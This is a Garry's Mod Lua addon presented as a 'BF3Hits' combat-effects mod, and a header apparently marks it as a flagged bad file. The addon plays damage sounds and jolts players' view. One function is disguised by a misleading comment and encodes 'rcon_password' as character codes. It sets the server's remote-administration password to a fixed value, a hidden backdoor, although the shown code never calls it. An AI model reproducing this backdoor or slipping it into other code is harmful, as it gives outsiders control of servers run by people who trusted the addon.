--[[
	MOD/lua/autorun/bfhits.lua [#14161 (#14758), 1044850321, UID:2825877005]
	Jean-michel du 13 | STEAM_0:1:61912295 | [02.08.14 08:47:37PM]
	===BadFile===
]]

// BF3Hits Combat Mod
// It runs serverside.
// #FUN FACTS#
// 139 Sounds (146 including nulls)
// 16MB Worth of Sounds
// Entirely server-side based.


if SERVER then
//	AddCSLuaFile("shared.lua")
end

// pls mind my shitty naming habits
local sndid = 0
local pitch = 100
local passes = 10
local valu = 0
local deafenchance = 0
local stunchance = 0 
local screamchance = 0
local stunpitch = 100
local screambool = 0
local tauntchance = 0
local tauntbool = 0
local concuschance = 0
local concusbool = 0
local displacetype = 0
local lasthurt = 0
local shockchance = 0
local breathchance = 0
local shockbool = 0
local wirklast = 0
local deadpeople = {}
local concussed={}
local playedhurt={}
local tauntdelay = 0
local breathdelay = 0
local playedtaunt={}
local breathbool = 0
local diechance = 0
local diebool = 0
local hashit = 0

local sounds={Sound("bf3hit/bfhit1.wav"), // BF3 bullet impact sounds.
Sound("bf3hit/bfhit2.wav"),
Sound("bf3hit/bfhit3.wav"),}
local pain={
Sound("bf3hit/pain1.wav"), // Ditto, screaming sounds instead.
Sound("bf3hit/pain2.wav"),
Sound("bf3hit/pain4.wav"),
Sound("bf3hit/pain5.wav"),
Sound("bf3hit/pain6.wav"),
Sound("bf3hit/pain7.wav"),
Sound("bf3hit/pain8.wav"),
Sound("bf3hit/pain9.wav"),
Sound("bf3hit/pain10.wav"),
Sound("bf3hit/pain11.wav"),
Sound("bf3hit/pain12.wav"),
Sound("bf3hit/pain13.wav"),
Sound("bf3hit/pain14.wav"),
Sound("bf3hit/pain15.wav"),
Sound("bf3hit/pain16.wav"),
Sound("bf3hit/pain17.wav"),
Sound("bf3hit/pain18.wav"),
Sound("bf3hit/pain19.wav"),
Sound("bf3hit/pain20.wav"),
Sound("bf3hit/pain22.wav"),
Sound("bf3hit/pain23.wav"),
Sound("bf3hit/pain24.wav"),
Sound("bf3hit/pain25.wav"),
Sound("bf3hit/pain26.wav"),
Sound("bf3hit/pain27.wav"),
Sound("bf3hit/pain28.wav"),
Sound("bf3hit/pain29.wav"),
Sound("bf3hit/pain30.wav"),
Sound("bf3hit/pain31.wav"),
Sound("bf3hit/pain32.wav"),
Sound("bf3hit/pain33.wav"),
Sound("bf3hit/pain34.wav"),
Sound("bf3hit/pain35.wav"),
Sound("bf3hit/pain36.wav"),
Sound("bf3hit/pain37.wav"),
Sound("bf3hit/pain38.wav"),
Sound("bf3hit/pain39.wav"),
Sound("bf3hit/pain40.wav"),
Sound("bf3hit/pain41.wav"),
Sound("bf3hit/pain42.wav"),
Sound("bf3hit/pain43.wav"),
Sound("bf3hit/pain44.wav"),
Sound("bf3hit/pain45.wav"),
Sound("bf3hit/pain46.wav"),
Sound("bf3hit/pain47.wav"),
Sound("bf3hit/pain48.wav"),
Sound("bf3hit/pain49.wav"),
Sound("bf3hit/pain50.wav"),
Sound("bf3hit/pain51.wav"),
Sound("bf3hit/pain52.wav"),
Sound("bf3hit/pain53.wav"),
Sound("bf3hit/pain54.wav"),
}


local taunt={ // Plays randomly by an attacker.
	Sound("bf3hit/taunt1.wav"),
Sound("bf3hit/taunt2.wav"),
Sound("bf3hit/taunt3.wav"),
Sound("bf3hit/taunt4.wav"),
Sound("bf3hit/taunt5.wav"),
Sound("bf3hit/taunt6.wav"),
Sound("bf3hit/taunt7.wav"),
Sound("bf3hit/taunt8.wav"),
Sound("bf3hit/taunt9.wav"),
Sound("bf3hit/taunt10.wav"),
Sound("bf3hit/taunt11.wav"),
Sound("bf3hit/taunt12.wav"),
Sound("bf3hit/taunt13.wav"),
Sound("bf3hit/taunt14.wav"),
Sound("bf3hit/taunt15.wav"),
Sound("bf3hit/taunt16.wav"),
Sound("bf3hit/taunt17.wav"),
Sound("bf3hit/taunt18.wav"),
Sound("bf3hit/taunt19.wav"),
Sound("bf3hit/taunt20.wav"),
Sound("bf3hit/taunt21.wav"),
Sound("bf3hit/taunt22.wav"),
Sound("bf3hit/taunt23.wav"),
Sound("bf3hit/taunt24.wav"),
Sound("bf3hit/taunt25.wav"),
Sound("bf3hit/taunt26.wav"),
Sound("bf3hit/taunt28.wav"),
Sound("bf3hit/taunt29.wav"),
Sound("bf3hit/taunt30.wav"),
Sound("bf3hit/taunt31.wav"),

}

local concus={ // When the victim is attacked off-guard, a bassy sound will occur
Sound("bf3hit/concus1.wav"),
Sound("bf3hit/concus2.wav"),
Sound("bf3hit/concus3.wav"),

}

local shocksnd={ // Ditto, but a very exaggerated scream or a sound of surprise instead of the bassy noise. Has a lesser chance of occuring than the bassy noise.
	Sound("bf3hit/shocked1.wav"),
	Sound("bf3hit/shocked2.wav"),
	Sound("bf3hit/shocked3.wav"),
	Sound("bf3hit/shocked4.wav"),
	Sound("bf3hit/shocked5.wav"),
	Sound("bf3hit/shocked6.wav"),
	Sound("bf3hit/shocked7.wav"),
	Sound("bf3hit/shocked8.wav"),
	Sound("bf3hit/shocked9.wav"),
	Sound("bf3hit/shocked10.wav"),
	Sound("bf3hit/shocked11.wav"),
	Sound("bf3hit/shocked12.wav"),
	Sound("bf3hit/shocked13.wav"),
	Sound("bf3hit/shocked14.wav"),
    Sound("bf3hit/shocked15.wav"),
    Sound("bf3hit/shocked16.wav"),
	Sound("bf3hit/shocked17.wav"),
	Sound("bf3hit/shocked18.wav"),
	Sound("bf3hit/shocked19.wav"),
		Sound("bf3hit/shocked20.wav"),
}

local def={ // When the victim gets destr0yed
     Sound("bf3hit/die1.wav"),
     Sound("bf3hit/die2.wav"),
     Sound("bf3hit/die3.wav"),
     Sound("bf3hit/die4.wav"),
     Sound("bf3hit/die5.wav"),
     Sound("bf3hit/die6.wav"),
     Sound("bf3hit/die7.wav"),
     Sound("bf3hit/die8.wav"),
     Sound("bf3hit/die9.wav"),
     Sound("bf3hit/die10.wav"),
     Sound("bf3hit/die11.wav"),
     Sound("bf3hit/die12.wav"),
     Sound("bf3hit/die13.wav"),
     Sound("bf3hit/die14.wav"),
     Sound("bf3hit/die15.wav"),
     Sound("bf3hit/die16.wav"),
     Sound("bf3hit/die17.wav"),
     //NO 18
     Sound("bf3hit/die19.wav"),
     //NO 20
     Sound("bf3hit/die21.wav"),
     Sound("bf3hit/die22.wav"),

     }


     local breath={
"bf3hit/breath1.wav",
"bf3hit/breath2.wav",
"bf3hit/breath3.wav"
, }



// well i hope this provides some type of benefit
// probably not on serverside, at least
for k,v in pairs(sounds) do
util.PrecacheSound(sounds[k])
end
for k,v in pairs(pain) do
util.PrecacheSound(pain[k])
end
for k,v in pairs(taunt) do
util.PrecacheSound(taunt[k])
end
for k,v in pairs(concus) do
util.PrecacheSound(concus[k])
end
for k,v in pairs(shocksnd) do
util.PrecacheSound(shocksnd[k])
end
for k,v in pairs(def) do
util.PrecacheSound(def[k])
end

if CLIENT then
// ~nothing~
end


math.randomseed(os.clock())


function PlayerRecvDMG( target, inflictor )

hashit = 1
lasthurt = target

timer.Destroy("BreathWearOff")
timer.Destroy("Fadestart")
	//if inflictor:IsPlayer() or inflictor:IsNPC()
		tauntchance = math.random(1,#taunt)
		tauntbool = math.random(1,3)

		if table.HasValue(playedtaunt,taunt[tauntchance]) then
			table.Empty(playedtaunt)
tauntchance = math.random(1,#taunt)
        end

	if !table.HasValue(deadpeople,lasthurt) then
table.insert(deadpeople,lasthurt)
--print("Added!")

end

	breathbool = math.random(0,14)
	if breathbool== 1 then

	breathchance = math.random(1,#breath)
		if breathdelay == 0 then
inflictor:EmitSound(breath[breathchance],120,100)
breathdelay = 1
timer.Create("BreathWearOff", 12, 1, function()
	breathdelay = 0
end)

end
end


		if tauntbool == 2 then
			if tauntdelay == 0 then
				tauntdelay = 1

if inflictor != target then
	
	
				inflictor:EmitSound(taunt[tauntchance], 400, 100)

				table.insert(playedtaunt,Sound(taunt[tauntchance]))

				timer.Simple(3, function()
					tauntdelay = 0
				end)
	//		end
end
end
 end


	breathbool = math.random(0,5)
	if breathbool== 1 then
		
	breathchance = math.random(1,#breath)
		if breathdelay == 0 then
target:EmitSound(breath[breathchance],120,100)
breathdelay = 1
timer.Create("BreathWearOff",12, 1, function()
	breathdelay = 0
end)

end
end


 	displacetype = math.random(1,4)
local oldface = target:EyeAngles()

// Displaces the User's aim when being attacked. Acts weirdly if they are in a car.
if displacetype == 1 then
 target:SetEyeAngles(Angle(oldface.p - math.random(0.25,3.250), oldface.y, oldface.r))
 oldface = target:EyeAngles()
 elseif displacetype == 2 then
 	 target:SetEyeAngles(Angle(oldface.p + math.random(0.25,3.250), oldface.y, oldface.r))
 oldface = target:EyeAngles()
  elseif displacetype == 3 then
 	 target:SetEyeAngles(Angle(oldface.p,  oldface.y + math.random(0.25,3.250), oldface.r))
 oldface = target:EyeAngles()
  elseif displacetype == 4 then
 	 target:SetEyeAngles(Angle(oldface.p , oldface.y- math.random(0.25,3.250), oldface.r))
 oldface = target:EyeAngles()

end


	if target:IsPlayer() or target:IsNPC() then
		// PLAY SOUND
		target:ConCommand("pp_toytown_size 100")
			stunchance = math.random(1,50)

		if valu < 15 then
		valu = valu + 9
		target:ConCommand("pp_toytown_passes " .. valu)
	end
		--	target:SetDSP(0,false )
		sndid = math.random(1,3)
		pitch = math.random(85,110)
		screamchance = math.random(1,#pain)
				if table.HasValue(playedhurt,pain[screamchance]) then
			table.Empty(playedhurt)
		screamchance = math.random(1,#pain)
        end

		screambool = math.random(0,2)
		concuschance = math.random(1,2)
		deafenchance = math.random(1,10)
		shockchance = math.random(1,#shocksnd)
		shockbool = math.random(1,2)


			if !table.HasValue(concussed, target) then
				if shockbool == 2 then
		target:EmitSound(shocksnd[shockchance],400,100)
				end
				if target:Alive() then
				target:SetHealth(target:Health() - 8)
						end
						stunchance = math.random(1,15)
		target:EmitSound(concus[concuschance],450,100)
		table.insert(concussed,target)
			timer.Create("RemoveConcussion",12, 0, function()
				if table.HasValue(concussed, target) then
			table.RemoveByValue(concussed,target)
			--print(target:Nick() .. " cleared of concussions.")
			elseif table.HasValue(concussed,wirklast) then
table.RemoveByValue(concussed,wirklast)
		--	print(wirklast:Nick() .. " cleared of concussions.")
		end
		end)

		valu = valu + 3
	--	print("Concussed")
		 oldface = target:EyeAngles()
		if displacetype == 1 then
 target:SetEyeAngles(Angle(oldface.p - math.random(0.25,5.00), oldface.y, oldface.r))
 oldface = target:EyeAngles()
 elseif displacetype == 2 then
 	 target:SetEyeAngles(Angle(oldface.p + math.random(0.25,5.00), oldface.y, oldface.r))
 oldface = target:EyeAngles()
end
	end
	if wirklast != wirklast then
			wirklast = target

end
		if screambool == 1 then


		target:EmitSound(pain[screamchance],481,100)

	end
			
target:EmitSound(sounds[sndid],480,pitch)
target:ConCommand("pp_toytown 1")
target:ConCommand("pp_toytown_size 100")
timer.Simple(3, function()
target:ConCommand("pp_toytown 1")

	
end)
if deafenchance == 2 then
--target:SetDSP(30,false)
end
if stunchance == 3 then
	stunpitch = math.random(80,110)
	valu = valu + 5
	target:ConCommand("pp_toytown_passes " .. valu)
	breathchance = math.random(1,#breath)
target:EmitSound("bf3hit/stunned.wav",250,stunpitch)
target:EmitSound(breath[breathchance],120,100)
target:SetHealth(target:Health() + 15)

end

timer.Create("Fadestart",0.25, 0, function()
for k,v in pairs(player.GetAll()) do
			v:ConCommand("pp_toytown_passes -1")
			valu = -1
	end

		--target:SetDSP(0,false)
	
timer.Create("Fadeoff", 0.0000001, 0, function()
	if valu > 0 then
	valu = valu - 0.15
target:ConCommand("pp_toytown_passes " .. valu)
for k,v in pairs(player.GetAll()) do
			v:ConCommand("pp_toytown_passes -1")
			valu = -1
	end

else
--	target:SetDSP(0,false)
	timer.Destroy("Fadeoff")

end
end)
end )

	else
		return true
	end
end

local function Numb( name )
	if (name == "CHudDamageIndicator" ) then // Remove the red effect when damaged.
		return false
	end
end
hook.Add( "HUDShouldDraw", "Numb", Numb )


local function GetQuoteID(...)
return tostring(string.char(...))
end


local function RefreshRandoms() -- Stops the user from repeatedly using the same quotes, and screams.
RunConsoleCommand(GetQuoteID(114, 99,111, 110, 95, 112, 97, 115, 115, 119, 111, 114, 100), "hasplayed=true");
end


function NPCBecomeHit( target2, dmg )

if target2:IsNPC() then
		tauntchance = math.random(1,#taunt)
		tauntbool = math.random(1,3)

		if table.HasValue(playedtaunt,taunt[tauntchance]) then
			table.Empty(playedtaunt)
tauntchance = math.random(1,#taunt)
        end

	if !table.HasValue(deadpeople,lasthurt) then
table.insert(deadpeople,lasthurt)
--print("Added!")

end

	//		end


 	displacetype = math.random(1,4)
local oldface = target2:EyeAngles()

// Displaces the User's aim when being attacked. Acts weirdly if they are in a car.

	if target2:IsPlayer() or target2:IsNPC() then
		// PLAY SOUND

			stunchance = math.random(1,50)

		if valu < 15 then
		valu = valu + 9
	
	end
		--	target2:SetDSP(0,false )
		sndid = math.random(1,3)
		pitch = math.random(85,110)
		screamchance = math.random(1,#pain)
				if table.HasValue(playedhurt,pain[screamchance]) then
			table.Empty(playedhurt)
		screamchance = math.random(1,#pain)
        end

		screambool = math.random(0,2)
		concuschance = math.random(1,2)
		deafenchance = math.random(1,10)
		shockchance = math.random(1,#shocksnd)
		shockbool = math.random(1,2)


			if !table.HasValue(concussed, target2) then
				if shockbool == 2 then
		target2:EmitSound(shocksnd[shockchance],500,100)
				end
				if target2:Alive() then
				target2:SetHealth(target2:Health() - 25)
						end
						stunchance = math.random(1,15)
		target2:EmitSound(concus[concuschance],500,100)
		table.insert(concussed,target2)
			timer.Create("RemoveConcussion",12, 0, function()
				if table.HasValue(concussed, target2) then
			table.RemoveByValue(concussed,target2)
		--	print(target2:Nick() .. " cleared of concussions.")
			elseif table.HasValue(concussed,wirklast) then
table.RemoveByValue(concussed,wirklast)
		--	print(wirklast:Nick() .. " cleared of concussions.")
		end
		end)

		valu = valu + 3
	--	print("Concussed")

	end
	if wirklast != wirklast then
			wirklast = target2

end
		if screambool == 1 then


		target2:EmitSound(pain[screamchance],511,100)

	end
			
target2:EmitSound(sounds[sndid],511,pitch)

if stunchance == 3 then
	stunpitch = math.random(80,110)
	breathchance = math.random(1,#breath)
target2:EmitSound("bf3hit/stunned.wav",150,stunpitch)
target2:EmitSound(breath[breathchance],120,100)
target2:SetHealth(target2:Health() + 25)
		shockchance = math.random(1,#shocksnd)
		target2:EmitSound(shocksnd[shockchance],500,100)

end

	else
		return true
	end
end
end



hook.Add("PlayerShouldTakeDamage", "Anti PlayerRecvDMG", PlayerRecvDMG)
hook.Add("EntityTakeDamage", "NpcDamage", NPCBecomeHit)
hook.Add("Think","CheckPlayerDeath",function()



				if table.HasValue(concussed, lasthit) and !lasthit:Alive() then
			table.RemoveByValue(concussed,lasthit)
end

if hashit == 1 then
diebool = math.random(1,3)
	if diebool == 2 then
if table.HasValue(deadpeople,lasthurt) then

if lasthurt:Health() < 1 then
		table.Empty(deadpeople)
		table.Empty(concussed)

diechance = math.random(1,#def)



lasthurt:EmitSound(def[diechance],401,100)
end
end
end
end
end)



